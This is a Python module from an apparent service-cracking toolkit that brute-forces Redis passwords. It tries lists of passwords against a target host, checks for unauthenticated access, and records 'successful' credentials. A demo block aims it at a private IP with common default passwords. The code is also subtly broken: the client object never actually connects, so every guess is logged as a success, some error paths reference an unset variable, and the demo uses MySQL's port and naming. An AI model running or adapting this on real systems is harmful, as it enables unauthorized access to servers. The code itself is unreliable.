# coding: utf-8
import redis

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("redis")

service_name = "redis"


class RedisCrack(BaseCrack):
    ignore_username_check = True

    def __init__(self, host, port, usernames, passwords):
        # redis 连接不需要账号
        usernames = ["root"]
        super(RedisCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 6379

    def crack(self):
        # 进行账密爆破
        for username in self.usernames:
            for password in self.passwords:
                self.auth(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def noauth(self):
        logging.debug("start node auth to crack redis")
        success = 0
        try:
            conn = redis.Redis(host=self.host, port=self.port, socket_connect_timeout=self.timeout)
            self.result["no_auth"] = True
            success = 1
        except Exception as e:
            logging.debug(e)
            conn.close()
        finally:
            if not success:
                return
            conn.close()

    def auth(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            conn = redis.Redis(host=self.host, port=self.port, password=password, socket_connect_timeout=self.timeout)
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close()
        finally:
            if not success:
                return
            conn.close()
            self.result["crack_result"].append({"username": username, "password": password})

    def get_service_info(self):
        # 获取服务信息
        pass


if __name__ == '__main__':
    host = "10.0.81.85"
    port = "3306"
    usernames = ["root", "admin"]
    passwords = ["root", "admin", "123456"]
    mysqlcrack = RedisCrack(host, port, usernames, passwords)
    mysqlcrack.crack()
